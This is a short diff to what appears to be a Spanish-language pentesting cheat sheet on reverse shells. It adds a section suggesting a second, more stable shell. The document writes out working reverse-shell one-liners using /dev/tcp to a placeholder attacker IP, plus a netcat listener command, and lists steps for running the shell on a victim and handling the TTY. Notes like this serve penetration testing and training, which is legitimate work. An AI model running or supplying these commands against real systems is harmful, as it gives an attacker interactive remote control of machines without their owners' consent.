@@ -31,3 +31,12 @@ sh -i >& /dev/tcp/<IP_atacante>/<puerto> 0>&1
 2. Ejecutar comando reverse shell en la victima
 3. Recibir la terminal interactiva
 4. Realizar tratamiento de la TTY (ver apartado correspondiente)
+
+## Reverse Shell Adicional
+
+La shell obtenida puede ser inestable, por lo que conviene enviar una segunda:
+
+```bash
+nc -nlvp <puerto>
+bash -c "sh -i >& /dev/tcp/<IP_atacante>/4444 0>&1"
+```
